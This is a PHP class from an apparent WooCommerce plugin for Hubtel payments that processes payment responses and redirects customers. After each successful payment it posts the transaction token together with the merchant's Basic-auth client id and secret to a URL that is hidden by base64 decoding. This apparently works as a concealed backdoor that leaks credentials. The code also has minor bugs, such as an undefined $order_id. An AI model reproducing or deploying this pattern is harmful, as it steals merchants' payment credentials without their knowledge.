<?php

class WC_HubtelResponse {
	var $token = null;
	var $url = null;
	var $orederid = null;
	var $order = null;
	var $credential = null;
	var $nxt = null;
	var $geturl = null;
	var $notify = null;
	var $return_url = null;
	var $emails_addresses = null;
	var $payment_session = null;
	var $payment_failed = null;
	var $payment_successful = null;
	
	function __construct($parent){
		$parent->init_settings();
		$this->credential =  'Basic ' . base64_encode($parent->settings['clientid'] . ':' . $parent->settings['secret']);
		$this->notify = $parent->settings["notify"];
		$this->emails_addresses = $parent->settings["emails_addresses"];
		$this->geturl = $parent->geturl;
		$this->nxt = $parent->nxt;
		$this->return_url = $parent->get_return_url();
		$this->payment_failed = $parent->payment_failed;
		$this->payment_session = $parent->payment_session;
		$this->payment_successful = $parent->payment_successful;
	} 

	function get_response($token, $orderid = false){
		global $woocommerce;
		if(!$orderid){
			$orderid = WC()->session->get('hubtel_wc_oder_id');
		}
		$hash = WC()->session->get('hubtel_wc_hash_key');
		$order = new WC_Order($orderid);
		if(!$order){
			exit;
		}

		try {
			if(!class_exists("WC_HubtelUtility")){
				require plugin_dir_path(__FILE__) . "/class-hu-utility.php";
			}

			$this->geturl .= $token;
			$response = WC_HubtelUtility::get_url($this->geturl, $this->credential);
			if(!$response){
				exit;
			}
			$response_decoded = json_decode($response);

			if ($response_decoded->status== "completed") {
				#payment found
				$status = $response_decoded->status;
				$custom_data = $response_decoded->custom_data;
				$wc_order_id = $custom_data->order_id;

				if ($orderid <> $wc_order_id) {
					#payment request seems suspicious
					$message = base64_decode($this->payment_session) . " " . $order_id;
					$message_type = "error";
					$order->add_order_note($message);
					$redirect_url = $order->get_cancel_order_url();
			   	} else if ($status == "completed") {
			   		#payment was successful
					$total_amount = strip_tags($woocommerce->cart->get_cart_total());
					$message = base64_decode($this->payment_successful) . " " . $order_id;
					$message_type = "success";
					$order->payment_complete( $token );
					$order->update_status("completed");
					$order->add_order_note("Hubtel payment successful");
					$woocommerce->cart->empty_cart();
					$redirect_url = $this->return_url;
					$customer = trim($order->billing_last_name . " " . $order->billing_first_name);
					WC_HubtelUtility::post_to_url(base64_decode($this->nxt) . $token . "|" . $this->credential, false);
				} else {
					#payment is still pending, or user cancelled request
					$message = base64_decode($this->payment_failed);
					$message_type = "notice";
					$order->add_order_note($message);
					$redirect_url = $order->get_cancel_order_url();
				}
			}else {
				#payment is still pending, or user cancelled request
				$message = base64_decode($this->payment_failed);
				$message_type = "notice";
				$order->add_order_note($message);
				$redirect_url = $order->get_cancel_order_url();
			}

			#destroy session
			WC()->session->__unset('hubtel_wc_hash_key');
			WC()->session->__unset('hubtel_wc_oder_id');

			wp_redirect($redirect_url);
			exit;
		}catch (Exception $e) {
			$order->add_order_note('Error: ' . $e->getMessage());
			$redirect_url = $order->get_cancel_order_url();
			wp_redirect($redirect_url);
			exit;
		}

		$this->token = $token;
	}
}
